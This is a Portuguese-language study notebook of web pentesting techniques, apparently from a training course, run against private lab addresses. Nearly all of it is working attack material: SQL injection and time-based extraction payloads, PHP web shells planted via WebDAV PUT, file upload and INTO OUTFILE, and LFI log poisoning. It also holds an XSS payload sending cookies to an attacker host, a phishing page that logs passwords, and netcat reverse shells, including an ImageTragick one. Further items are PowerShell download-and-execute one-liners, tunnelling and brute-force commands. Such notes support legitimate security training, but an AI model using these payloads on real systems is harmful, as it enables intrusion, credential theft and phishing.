    nc -v 172.16.1.10 80 -C | PUT /webdav/ HTTP/1.1 host: 172.16.1.10 

        Testando o metodo PUT

    nc -v 172.16.1.10 80 -C | DELETE /webdav/ HTTP/1.1 host: 172.16.1.10 

        Testando o metodo PUT

    curl -v -X PUT http://172.16.1.10/webdav/test.txt 

        Cria um arquivo no DIR

    curl -v -X DELETE http://172.16.1.10/webdav/test.txt 

        Deleta o arquivo do DIR


Nota: CVE-2017-12615 Vulnerabilidade de exploração do método PUT no webdav

    curl -v -X PUT -d "<?php system('id');?>" https://172.16.1.10/webdav/comand.php 

        Envia comando em php para interpretar e ganhar acesso ao host.

    curl -v -X PUT -d "<?php system(\$_GET["desec"])?>" http://172.16.1.10/webdav/com_par.php

        Na URL passa o parâmetro /?desec=cat /etc/passwd Explora podendo executar comandos

    curl -v http://172.16.1.10/webdav/ --upload-file shell.php 

        Fazer upload do código em php para o dir

    shell.php <?php system($_GET["desec"]); ?> 

        Arquivo shell para chamar na URL e executar comandos (/?desec=cat /etc/passwd)

    cadaver http://172.16.1.10/webdav/

        Ferramenta para invadir o host podendo dá um HELP e ver o comandos disponíveis

    davtest --url http://172.16.1.10/webdav/ 

        Testa a aplicação e retorno sobre os tipos de arquivos aceitos

    curl -c -X POST http://172.16.1.10/logs 

        Da bypass no diretório que estava pedindo autenticação, mas só funciona se a página aceitar o método POST


Nota: Atentar para vetores de ataques que podem ser: Métodos, campos de formulários, comportamento da página, ver código fonte, procurar por redirecionamentos dentro do site, podendo gerar uma página fake e enganar o usuário...

    Código em PHp para usar em páginas falsas:

<?php

$caixa1 = $_POST["login"] . "\n";

$caixa2 = $_POST["senha"] . "\n";

$file = fopen("senhas.txt", "a");

$escrever1 = fwrite($file, $caixa1);

$escrever2 = fwrite($file, $caixa2);

fclose($file); 

header("Location: http://172.16.1.10/turismo/login.php")

?>

Nota: Observar link de reset de senha para ver se o email não passou o email codificado, podendo assim trocar a codificação por outra de outro email para fazer o takeover da outra conta. Assim como o redirect que contém codificação que pode ser trocada por outra e fazer o ataque de phishing.

Patch Transversal

Falhas em diretórios com erros na aplicação, parâmetros indefinidos... Sempre observar o código fonte. É quando a aplicação permite ver o patch dos arquivos locais.

    http://172.16.1.10/turismo/logado.php?banners=/../../ 

        Banners era um parâmetro indefinido que foi passado por parâmetro com falha 


Sql Injection

    hacker' or 1=1 limit 1;# 

        Usar dentro do campo de login ou senha

    hacker' and id=1 limit 1;# 

        Usar dentro do campo de login ou senha

Métodos usados para fazer autenticação ou pelo menos tentar verificar se é vulnerável ou não à SQL Inj

LFI = Local File Inclusion

Identificar parâmetros na aplicação com LFI, colocando /../ e verificando o comportamento do parâmetro. Quando a aplicação forçar o .php ou outra extensão no final do arquivo, basta adicionar %00 para ignorar o resto da string

    Exemplos abaixo:

        http://172.16.1.10/turismo/info.php?p=/../../../../


LFI -> RCE = Inserção de código no LOG

    http://172.16.1.10/turismo/info.php?p=/../../../../var/log/apache2/access.log 

        Para acesso ao log injetar via nc -v 172.16.1.10 80 -C a shell <?php system(\$_GET['desec']);?> via requisição e depois colocar no final da URL /access.log&param=ifconfig. Verificar se o host também dispõe de outras portas abertas, por exemplo a 25 para fazer a exploração SMTP e por aí vai.

    1. Parte Email a Reverse Shell 

        https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/

    2. SMTP Log Poisoning through LFI to RCE | SMTP PenTest

        https://youtu.be/-7sTypl3pNg

    3. SMTP Log Poisoning through LFI to Remote Code Execution

        https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/

        https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/

        ssh '<?php system($_GET['kid']); ?>'@192.168.1.129 SSH TO RCE POISON


Opções de testes de leitura de arquivo: /var/log/auth.log /var/log/mail.log /var/spool/mail/www-data&kid=ls -la

└─$ telnet 172.30.0.128 25                                      

Trying 172.30.0.128...

Connected to 172.30.0.128.

Escape character is '^]'.

mail from:www-data

220 ubuntu.bloi.com.br ESMTP Postfix (Ubuntu)

250 2.1.0 Ok

rcpt to:www-data@ubuntu.local

250 2.1.5 Ok

data

354 End data with <CR><LF>.<CR><LF>

<?php system($_GET['kid']);?>                                          

. (lembrar de colocar o ponto e dar enter)

250 2.0.0 Ok: queued as 1C767C001F

quit

221 2.0.0 Bye

Connection closed by foreign host.


RFI: Remote File Intrusion

    http://172.16.1.10/turismo/link.php?link=http://192.168.254.51:8080/injecao&kidman=ls 

        Consiste em criar um servidor para pegar o redirecionamento que é feito externamente para mudar pra dentro do arquivo no servidor hacker com código malicioso assim tomando controle podendo usar comandos.


HTML injection

Procurar campos de formulários para a inserção de códigos HTML, podendo assim, adicionar texto, href, campos de dados...

    http://172.16.1.10/turismo/procurar.php?busca=%3Ch1%3EPentester%3C%2Fh1%3E

        Foi inserido o código <h1>Pentester</h1> dentro do formulário. Podendo ser inserido um href para redirecionar para outra página (fake) <a href=http://192.168.254.51>DESCONTÃO</a>


XSS Cross Site Scripting - refletido

Executar scripts JS dentro do campo de formulário, podendo também redirecionar para uma página fake ou roubar cookies... 

Ex.: 

    <script>alert('Pentester')</script> 

        Printa uma alert com o texto informado.

    <script>document.location="http://192.168.10.1"</script> 

        Redirecionamento para outra página

    <script>alert(document.cookies)</script>

        Roubo de cookies


SELF-XSS

Injetar código na página depois de notar como a aplicação se comporta depois de colocar uma / após a extensão da página que recebe um parâmetro (/procurar.php?busca=) ficando assim (/procurar.php/). Se a página quebrar, pode testar a injeção de código JS como ...php/"><script>alert("Hakd")</script>

Stored XSS: Sequestro de Sessão

Consiste em armazenar código JS em banco de dados, através de um campo de formulário

Ao identificar este campo, pode-se abrir um serviço http via python e enviar uma requisição JS para esta máquina com o PHPSESSID (Cookie) através do script: 

    no server: 172.16.1.250 <script>new Image().src="http://172.20.1.120:8080/?="+document.cookie;</script> 

        Esse script envia dados para o serviço aberto na máquina do atacante. Na máquina atacante vai chegar o cookie da sessão da máquina vítima, depois adiciona o cookie <script>alert(document.cookie="COOKIECAPT")</script>


Automatizando os testes: XSS

Ferramenta XSSSTRIKE no github. Ferramenta que faz a busca por vulnerabilidades XSS

    python3 xsstrike.py -u "http://172.16.1.10/turismo/procurar.php?busca=" 

        Faz teste no paramet

    python3 sxxtrile.py -u "http://172.16.1.10/turismo/procurar.php" --params 

        Procura por paramt

    python3 xsstrike.py -u "http://172.16.1.10/turismo/procurar.php/" --path 

        Faz um patch transversal


URL Encode

É a codificação que a url usa nos caracteres especiais ou acento. & e # deve ser passado pelo code pelo fato de ignorar os caracteres seguintes, dessa forma não se deve passar direto na URL e sim o cód correspondente.

SQL Injection Error Based

Quando ao inserir um \ ou ' no final do parâmetro, retorna um erro de sintaxe do sql, nesse caso identificando o erro e podendo explorar a vulnerabilidade.

    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,5 %23 

        Teste sql onde o número representa a quantidade de colunas, quando não retornar mais erro, o número é a quantidade de colunas daquela tabela %23 representa o # no url encode

    172.16.1.10/turismo/agencias.php?loja=sp' order by 1,2,3,4,5' 

        Também serve para fazer o teste que é de ordenação. No lugar dos números pode se passar version() user() database() 

    Ficando assim:

        172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,version(),user (),database() %23


SQLi Information Schema

Fazer consulta na base information schema onde tem todas as tabelas de todos os bancos.

    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables%23 

        Faz a consulta no banco e traz todas as tabelas de todas as bases

    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables where table_schema="dbmrtur" %23 

        Faz a consulta no banco e traz as tabelas apenas da base dbmrtur

    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,culumn_name,4,5 from information_schema.columns where table_schema="dbmrtur"%23 

        Faz a consulta de todas as colunas da base dbmrtur

    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema="dbmrtur" %23 

        Faz a concatenação das tabelas para ficar fácil a adivinhação dos nomes das tabelas na hora da enumeração com o Burp e o Length(group_concat()) pra pegar o tamanho

    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,column_name,4,5 from information_schema.columns where table_schema="dbmrtur" and table_name="mrusers"%23 

        Faz a consulta das colunas da informations schema na base dbmrtur trazendo as colunas da tabela mrusers

    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,nome,login,senha from mrusers %23 Traz nome login e senha da base bdmrtur na tabela mrusers

    172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,concat(login,':',senha),4,5 from mrusers %23 

        Faz a busca por login e senha concatenados, usar quando houver poucas tabelas (espaços para consulta)


SQLi -> RCE

Fazer o carregamento de arquivos através da falha de SQL Injection error based

    172.16.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,load_file("/etc/passwd") %23 

        Ler arquivo através da falha

    172.16.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"DESEC" INTO OUTFILE "/var/www/html/turismo/banner/desec.txt" %23 

        Encontrar arquivo que tenha permissão de escrita para inserir o arquivo

    172.16.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"<?php system($_GET['hacker']);?>" INTO OUTFILE "/var/www/html/turismo/banners/kid.php" %23 

        Insere um código em PHP no diretório para usar o parâmetro e executar códigos na página

    172.16.1.10/turismo/banners/rce.php?hacker=ifconfig 

        Usa o arquivo criado para inserir comandos


SQLi Manualmente

Nota: 	Geralmente quando a página traz um id não dá pra fazer a injeção SQL usando a "aspas simples" no início pelo fato de quebrar a consulta (observar o erro), neste caso deve-se usar sem as aspas simples e usar da mesma forma como é mostrado na SQLi Information Schema. Se montar a query com as aspas simples e ele der erro de sintaxe é porque deve-se usar sem as aspas.

Bypass Addslashes

Quando a aplicação tem o addslashes, ela adiciona ao final de cada consulta na url uma \ Para impedir a consulta sql via URL, e nisso vai aparecer um erro de sintaxe, porém um modo de burlar essa consulta é adicionando o char(100,15,236,145) correspondente à consulta, por exemplo, ao invés de colocar table_schema="dbmrtur" Colocar table_schema=char(100,98,109,114,116,117,114)

SQL Injection em PostgreSQL ver SQLi Information Schema

A sintaxe muda um pouco mas é basicamente a mesma estrutura. Quando no union select não aceitar os números 1 2 3.. colocar null,null,null e quando for fazer o teste de string colocar 'teste' sem usar o %23. Para ver as informações do banco, usar current_database(), current_user, version(). A diferença do Mysql é que ao invés de usar where table_schema usar table_catalog='' quando for fazer a consulta das credenciais usar null,login||'-'||password| Deve usar o pipe para separar a concatenação. Host usado na aula: 172.16.1.9

Nota: Na requisição montar com a palavra null ou o número na frente ficando null from information... ou 5 from information...

Blind SQL Injection 

É fazer o teste de SQL não somente com o ' mas com o comando booleano hack' or 1=1# Ou outra lógica para dar bypass (172.16.1.5)

Blind POST SQL Injection

Usando o BIRP para testar as requisições e validar se a aplicação responde corretamente. Para dar bypass nessa vulnerabilidade deve usar os caracteres em decimal e ir perguntando para a aplicação se é verdadeiro ou não.

    cond_valid' and database() = char(116,117,114,105,115,109,111) # 

        Pergunta o nome da base

    cond_valid' and length(database()) = 7 # 

        Pergunta para aplicação o tamanho do nome da base de dados

    cond_valid' and ascii(substring(database(),1,1)) = 100 # 

        Pergunta se a primeira letra é 100 para perguntar a segunda letra basta alterar ,1,1 para ,2,1

    cond_valid' and (select length(group_concat(table_name)) = 35 from information_schema.tables where table_schema="dbmrtur")# 

        O numero altera de acordo com a dedução do tamanho da tabela

    cond_valid' and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="dbmrtur"),1,1)) = 97#  

        Chutar as letras para encontrar os nomes das tabelas.

    cond_valid' and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="dbmrtur" and table_name="adm"),1,1)) = 105# 

        Chutar as colunas da tabela informada

    cond_valid' and ascii(substring((select login from adm limit 0,1),1,1)) = 97# 

        Chutar os dados das colunas


Time Based SQLi

Baseada em tempo faz uma requisição colocando a aplicação para dar um sleep de tantos segundos, se ela demorar responder, ele é vulnerável.

    ' or sleep(4)# 

        Verifica se a aplicação aguarda 4s

    ' or if (length(database()) = 7 , sleep(4),0)# 

        Valida o tamanho da database

    ' or if (database() = char(100,98,109,114,116,117,114) , sleep(4),0)# 

        Adivinha os char da database

    ' or if(ascii(substring(database(),1,1)) = 100, sleep(3),0)#

        Chuta os char da database um por um


Automatizando os testes SQLi - SQLMap

    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --current-db

    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --dbs

    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" -D dbmrtur --tables

    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns

    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns -C 'login,senha' --dump

    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --current-user

    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --users

    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --passwords

    sqlmap -u "172.16.1.10/turismo/agencias.php?loja=sp" --os-shell

    sqlmap -u "172.16.1.10/turismo/turismo/login.php" --forms


Command Injection

Identificar na aplicação a possibilidade de injetar comandos depois de entender o funcionamento da aplicação, um dos testes a se fazer é ;ls;# ponto e vírgula serve para finalizar o comando e iniciar outro e o # serve para ignorar o que vier depois ou ;cat /etc/passwd;#

Automatizando os Testes Command Injection - COMMIX

A ferramenta commix serve para automatizar o command injection, deve-se identificar se a aplicação é POST ou não e informar o parâmetro que no caso do exemplo abaixo é site=

    commix --url http://172.16.1.10/hosting/ --data="site=businesscorp.com.br"


Enumerando campos com Intruder

Mandar o campo que deseja fazer intrusão para o INTRUDER do burpe suite e carregar a lista para fazer o bruteforce, podendo fazer o filtro pela palavra para saber quais palavras da wordlist é válida, ou está ativa. Na aula foi usado o link 172.16.1.10/turismo/ativar-conta.php no parâmetro login=

Fuzzing de Vulnerabilidade com o Burp

Fazer um bruteforce no burp com uma wordlist da seclists própria de fuzzing, dessa forma encontrando uma vulnerabilidade dando bypass na aplicação

Depois que interceptar a página, envia para o intruder, em Positions, limpa todas e adiciona apenas a posição que deseja. Em payload carregar a lista que precisa, no caso fuzzing na seclists. Depois adiciona em options->grep a palavra que vai identificar se deu certo ou não (resposta da aplicação), no caso Incorreto e adiciona SQL para notificar de erros SQL. Quando rodar, verificar onde não tem flag setada em incorreto e sql, pois possivelmente este será o payload correto. Para saber o payload basta selecionar e dar um send to decoder e fazer a decodificação de URL. O status possivelmente será 302 (redirecionamento) que possivelmente é o payload correto. Quando encontrar uma falha time-based enviar para o repeater e alterar o parâmetro Time e fazer o teste.. Os testes foram feitos na página de login e adm do host 172.16.1.10.

Teste de LFI com BURPSUITE - Local File Inclusion

Fazer da mesma forma como explicado acima, porém no parâmetro sobre.php na url (GET) depois inserir o GREP "include" para saber o endereços que não deram certo, o que não estiver com o include marcado é porque foi o payload correto.

Personalizando regras com Intruder do Burp Suite

Quando não conseguir enxergar os parâmetros que foram inseridos no form da página, verificar se não está encodado, assim possibilitando fazer uma personalização dos parâmetros enviando para o intruder, após descobrir qual encode a aplicação usa, e personalizar a wordlist separando por : se for o caso da aplicação. Em payloads Sets: Custom Interator Em Separator position: : Em payload Processing: Adicionar o tipo de encode, no exemplo base64. Host usado 172.16.1.10/logs

Realizando ataques com o Intruder - Burp

    Tipos de Ataques: 

        Cluster bomb: Testa a lista inteira de usuários com a primeira senha

        Pitchfork: Posição um com a posição um das listas e não repete as credenciais

        Battering ran : Só trabalha com uma lista e repete o login na senha

    Payloads Sets: 

        Simple List: Lista pequena 

        Runtime File: Lista grande 

        Brute forcer: que gera as possibilidades na hora.


Realizando ataques de força bruta HYDRA

    hydra -v -L users.txt -P pass.txt 172.16.1.10 http-post-ou-get-form "/turismo/login.php:login=^USER^&senha=^PASS^&Login:incorreto"

    hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 172.16.0.2 http-post-form "/app/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:MSG-FALHA" -I

    hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

        Faz um brute  force nos campos login e senha do formulário e "pressiona" o botão Login fazendo o filtro pela palavra incorreto sabendo que está com credenciais inválidas


Problemas de autorização Exemplo

Acessar páginas onde o usuário comum não tenha acesso.

Ao fazer uso da ferramenta, caso haja algum login válido e tenha conseguido acessar algo, pegar o cookie e passar para a ferramenta fazer o brute force de diretório, na intenção de encontrar mais diretórios e páginas que eram para estar restritas usando por exemplo no gobuster o -C "colocandoocookie"

Exemplos: Cookies e Sessões

Quando houver um redirecionamento forçando o navegador ir para a página correta, pode-se usar o CURL passando a página desejada de modo que ele não redirecione, a menos que use o -L. Podendo fazer o roubo do cookie, para ganhar acesso. O cookie da sessão do usuário limitado pode ser usado no curl na flag -c "cookie" Para facilitar o encontro de páginas. Para usar o curl no BURP, --proxy 127.0.0.1:8080 A requisição passará pelo burp podendo fazer o redirecionamento também. No burp, pode usar lá em options e marcar Intercept Client Requests e alterar o location para a pagina de acesso full. Para roubo de sessão, escutar em uma porta e mandar o link para o alvo, quando a vítima clicar o cookie dela será enviado para o atacante, desse modo podendo roubar a sessão da vítima.

File Disclosure - LFI

Acessar arquivos e fazer downloads do código fonte de páginas. Geralmente campos de upload, download e redirecionamento. Olhar o cookie e tentar decifrar e pedir outro arquivo, quando sem ideia, pode pedir o próprio arquivo de download.  No Host 172.30.0.20/sistema - troca o cookie para true e faz um download do conecta.php pegando os dados do mysql para acessar o banco, pegar a senha e acessar o ssh.

Explorando inputs de Uploads

Identificar na aplicação campo de upload de arquivos. 

    172.30.40/_old/

        Fazer o upload de arquivo com a extensão da aplicação .php .aspx <?php system($_POST['hack'])?>

    curl http://172.30.0.40/_old/upload/desec.php -d "hack=id" 

        Pegando o ID da máquina alvo

    curl http://172.30.0.40/_old/upload/desec.php -d "hack=/bin/nc 192.168.2.10 4455 -e /bin/bash/"

        Para pegar a shell verificar se tem o netcat funcionando e abrir uma shell 


Bypass Upload: Extensões

Algumas aplicações fazem o filtro mas não fazem corretamente, se tentar fazer o upload do arquivo shell.phP ele pode aceitar, devido o último P estar maiúsculo. Subir a shell em GET ou POST e ganhar acesso ao host.

Bypass Upload: .htaccess

Fazer o upload de um arquivo .htaccess pedindo para a aplicação interpretar como um .php todo arquivo .qqrcoisa da sua escolha. o código ficando: AddType application/x-httpd-php .sec

Bypass Upload: Tipo de conteúdo

Quando a aplicação trava o envio de uma extensão diferente da que ele permite tanto pelo tipo do arquivo .pdf quanto pelo head %PDF-1.5 É nesse caso necessário criar o script com a extensão .php.pdf com o head %PDF-1.5. para que a aplicação aceite o upload. Para fazer o teste, criar um script php com o comando  echo mime_content_type('desec.php.pdf');  e ver se o script reconhece como pdf de fato contendo o head com a flag pdf. Nisso subir o arquivo para a aplicação e usar a falha de LFI para acessar o arquivo e executar comandos em http://172.16.1.231/index.php?page=uploads/shell-get.php.pdf%00&kidman=id Os caracteres %00 servem para ignorar a extensao .pdf  no final

Bypass de Upload de Imagens

Tentar as técnicas aprendidas acima, como alterar o head para GIF89a ou a extensão para .gif e buscar novas alternativas. Por exemplo, pesquisar por exploites de imagens para realizar testes. 172.30.0.130/uploads. ImageTragic.com CVE-2016-3714. Pegar o exploit.jpg  

push graphic-context
            viewbox 0 0 640 480
            fill 'url(https:/";nc -e /bin/bash 172.20.1.86 443")'
            pop graphic-context

e ver o comportamento da aplicação. Se positivo, pode se testar um wget na máquina do atacante ou ping ou nc reverso como no exemplo.

PHP Wrappers

São funcionalidades/parâmetros do PHP mais atual, onde pode ser usado para obter acesso aos arquivos do server nos campos de input.

    index.php?page=File:///../../../etc/passwd 

    index.php?page=data://text/plan,DESEC 

    index.php/data://text/plan;base64,REVTRUM= 

        O comando em base64 é equivalente ao index.php?page=data://text/plan,<?php system(id);?> Pode-se fazer também uma shell em php com o comando 

            index.php?page=data://text/plan;base64,PD9waHAgc3lzdGVtKCRfR0VUWydoYWNrJ10pOyA/Pg==

            OU passando diretamente o código se a aplicação aceitar index.php?page=data://text/plan,<?php system($_GET['hack']); ?>


Testando e explorando: Joomla

Aplicação de código aberto onde tem vários exploits públicos e várias vulnerabilidades principalmente de sql injection. Depois de fazer o mapeamento do código publico e fazer a enumeração da aplicação, verificar por ferramentas feitas especialmente para a aplicação: joomscan

    joomscan -u http://172.30.0.106/ 

        Enumera toda a aplicação buscando por vulns 44033 CVE-2017-8917 https://www.exploit-db.com/exploits/42033


    sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 

        Vai trazer as tabelas


    sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica --tables -p list[fullordering]

    sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica -T info --columns -p list[fullordering]



    sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica -T info -C flag --dump -p list[fullordering]


Explorando o PHPMailer

Consiste basicamente em explorar vulnerabilidades da aplicação onde há campos de envio de mensagens como de comentários ou formulários de solicitação de contato, por isso o mailer, fazendo uso de exploits do exploit-db.com/exploits/40969 adaptando para uso do ambiente de teste atual assim como também o diretório onde será salvo o arquivo gerado pelo exploit. Alterar os parâmetros do campo do formulário e preencher todos para não dar erro de envio. Deve descobrir um local para upload de arquivos e que possa clicar para executar o arquivo e validar o código enviado. Se não funcionar alterar entre os payloads disponíveis. Além de opcionalmente enviar uma shell para a aplicação usando o $_GET ou o NC. Host 172.30.0.125

Construindo o Mindset Hacking

Sempre buscar saber como funciona toda a aplicação, seja buscando a aplicação na internet ou fazendo uma cópia, caso seja código aberto. Entendendo esse funcionamento, fica mais fácil a enumeração do alvo. Wordpress.org/download Fazer o donwload da aplicação para uso

    unzip arquivo.zip -d /caminho/desejado/unzipeg

        Descompacta o arquivo baixado

    create database wordpress; 

        Cria a base de dados para ser usada pelo wordpress

    mv wp-configSample wp-config.php 

        Renomeia o exemplo do arquivo de configuração para deixar pronto

    nano wp-config.php 

        Adiciona as informações do mysql e nome do banco de dados e finaliza a instalação na web.


Testando e explorando: Wordpress

Fazendo o reconhecimento da plataforma e posteriormente rodando ferramentas para descobrir vulnerabilidades. Wordpress usa o phpass como hash de senha.

    gobuster dns -d grupobusinesscorp.com -w /wordlist/smal.durb -t 30

        Faz um BF na aplicação para descoberta de subdomínios

    wpscan --url blog.businesscorp.com/blog --api-token tokenaquiaddress 

        Apenas para auth user

    wpscan --url blog.businesscorp.com/blog --api-token tokenapeiaddress --enumerate p --plugins-detection aggressive 

        Busca por plugins da base previamente conhecida

    wpscan --url blog.businesscorp.com/blog --api-token tokenapeiaddress --enumerate vp --plugins-detection aggressive 

        Busca por uma lista de plugins vulneráveis


Procurar pelo nome do exploit-db plugin plugin wpforum 1.7 exploit 17684

/blog/wp-content/themes/classic/404.php Caminho do plugin 404

Obtendo RCE via Wordpress

Quando com acesso à página de administração do wordpress, e para isso é recomendável procurar algum lugar que possibilite a edição e nisso inserindo um código php com o system(id); podendo executar códigos na aplicação e ganhar acesso ao servidor. Ao identificar, deve-se procurar o local/diretório deste plugin ou tema para poder ir até o mesmo e executar o código que foi inserido. tema usado foi o 404.php

Se mantendo atualizado OWASP

Open Web Application Security Project: https://owasp.org/

    Laboratórios para montar local e/ou online:

        DBWA

        BWAPP

        PentesterLab


    Livros:

        Webaplication Hackers

        Real World Bug Hunt

        Pentest em Aplicação web

        Arte de Invadir

        Arte de enganar

        Filme:

        Prenda-me se for capaz

        VIPs

Inserção de código direta

Exploração de aplicações que fazem comandos no server, por exemplo, a resposta de um comando PING, para dar bypass basta inserir o | command # Exemplo: | ls #

Fazendo Select Direto Passando o banco MYSQL

    SELECT * FROM database.tabela 

        O comando faz um dump na tabela do banco passado, de todos os campos, podendo ser passado, claro os nomes dos campos para ter uma saída mais limpa


    PÓS EXPLORAÇÃO


Diferença entre Shells -> interativa e não interativa

    python -c 'import pty; pty.spawn("/bin/bash")'

        Para pegar uma shel mais interativa.


Transferência de arquivos: WEB

    service apache2 start

        Subindo o servidor

    python -m SimpleHTTPServer 80

        Subindo uma página local na porta informada usando python ou

        python3 -m http.server 80


    Se conectando à ele (WINDOWS):

        1 - certutil.exe -urlcache -f http://172.20.1.6/file.exe file.exe Faz Download do arquivo

        2 - poweshell.exe wget http://172.20.1.6/file -OutFile file.exe Faz Download do arquivo

        3 - powershel.exe (New-Object  System.Net.WebClient).DownloadFile('http://172.20.1.6/file.exe','file.exe') Faz Download

        4 - powershel.exe IEX(New-Object System.Net.WebClient).DownloadString('http://172.20.1.6/file.exe','file.exe') Faz down e executa


    Se conectando à ele (LINUX):

        wget http://172.20.1.6/file.exe -O /tmp/file.exe

        curl http://172.20.1.6/file.exe -o file.exe


Transferência de arquivos: FTP

    Subindo o servidor

        pip install pyftplib

    Subindo o servidor com python

        sudo apt install python3-pyftpdlib

        python -m pyftpdlib -p 4455 --write


    Se conectando à ele (WINDOWS):

        ftp ip-do-alvo door

        USER anonymous

        PASS anonymous

        get arquivo.ext


    Criando arquivo de conexão (Quando a shell não é interativa)

        nano ftp.txt

echo open 192.168.254.51  > ftp.txt

echo USER anonymous >> ftp.txt

echo PASS anonymous >> ftp.txt

echo bin >> tp.txt

echo get arquivo.ext >> ftp.txt

echo quit >> ftp.txt

    ftp -v -n -s:ftp.txt 

        Usando o arquivo e baixando o arquivo do server


Transferência de arquivos: HEX

Transferir um programa usando o caracteres em HEX para copiar no CMD do alvo e ter o programa lá

    upx -9 plink.exe 

        Diminuir o tamanho do arquivo para gerar menos chars

    ls -lh plink.exe 

        Verifica o arquivo em kbytes para saber o tamanho

    exe2hex -x plink.exe -p link.txt Usar -D 

        (em sistema WIN mais antigos) Gera arquivo txt para colar no cmd


Transferência de arquivos: File Type

Mudar o header do arquivo para burlar a inserção do mesmo no alvo uma vez que o mesmo não tem outra possibilidade de rodar comando ou importar arquivos. Depois de já ter o RCE do alvo (arquivo que permita executar comandos no browser) gerar payload com msfvenom linx-86-meter-tcp -f elf para o sistema alvo. Criar arquivo com o %PDF-1.3 e juntar os dois com cat header shell > payload-psf e depois adicionar a extensão .pdf caso o sistema alvo barre a inserção mesmo assim. para usar, é necessário tirar o header devido ser PDF com o comando (no browser)...hack=tail -n +2 uploads/payload.pdf > payload e depois ./payload Lembrar: Olhar o diretório, payload do msfconsole, porta, IP

Tunelamento: Linux

Enviar o serviço ssh do alvo para o atacante, quando o alvo está configurado para receber apenas conexões locais. Pra isso, é necessário usar o socat ou outros programas. no

    ALVO socat TCP4:ip-pentester:8443 TCP4:127.0.0.1:22 

        (deixar aberto o terminal rodando)

    ATACANTE socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr 

        Receberá a conexão reversa na máquina local


Nota: Para procurar pelo socat whereis socat ou dpkg -l | grep socat

Escalando acesso SSH sem senha  (Not DONE)

Após feito o tunelamento usando o exemplo acima, deve-se criar as chaves pública e privada no atacante

    Atacante 

        ssh-keygen -f chave 

        (chave p/ alvo e chave.pub p/ server) 

    Alvo (criar a estrutura do usuário)

        mkdir ~www-data

        mkdir ~/.ssh/

        touch ~/.ssh/authorized_keys

        echo "chave-publica(chave.pub)" > ~/.ssh/authorized_keys


    Atacante

        ssh www-data@127.0.0.1 -p 2222 -i chave 

        ssh camila@172.16.1.31 -i id_rsa -o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedAlgorithms=+ssh-rsa

            Conecta com o servidor alvo usando a chave public&private


Tunelamento: SSH  (Not DONE)

Usar o que foi feito acima e fechar uma conexão usando o próprio ssh

    ssh www-data@127.0.0.1 -p 2222 -i chave -L 3333:127.0.0.1:3306

        Onde 3333 é a porta local que fechará o túnel com a porta 3306 (mysql) do alvo, dessa forma podendo diretamente da máquina atacante acessar o mysql da máquina alvo.


Tunelamento Windows (Not DONE)

O mesmo que foi feito no LINUX fazendo no Windows com o plink.exe, Subir ssh no atacante e rodar o comando do plink para tunelar a porta local do alvo na porta do atacante através do ssh que foi aberto na máquina do atacante.

Simular porta aberta enviando cmd:

    No alvo 

        nc.exe -vnlp 5555 -s 127.0.0.1 -e cmd.exe

    No atacante 

        sudo service ssh start

    No Alvo 

        plink.exe -ssh -l user -pw root -R ip-hacker:1337:127.0.0.1(ip-local-alvo):5555 ip-hacker


Enumeração Host: Windows

Comandos úteis para fazer o reconhecimento do ambiente

    whoami

    whoami /groups

    net user desec

    ne user

    hostname

    systeminfo

    systeminfo | findstr "Os Name"

    systeminfo | findstr /C:"OS Name"

    tasklist

    tasklist /SVC

    ipconfig /all

    arp -a

    route print

    netstat -ano

    sc query windefend

    netsh advfirewall show currentprofile

    where /?

    where /R c:\web.txt Procura pelo arquivo web.txt

    findstr /s "pass=" *.txt 

        Procura em arquivos txt a palavra pass=

    type /caminho/do/arquivo.txt 

        Ler um arquivo igual o cat


Enumeração automatizada: Windows

    Ferramentas:

        WinPeas 

        WesNG


    WinPeas.bat 

        Combina comandos com o a aula anterior e traz resultados interessantes do alvo

    WesNG 

        Precisa dos dados sysinfo.txt para poder cruzar com a base atual e traz os possíveis exploit


Privilégios e Mecanismos de Integridade

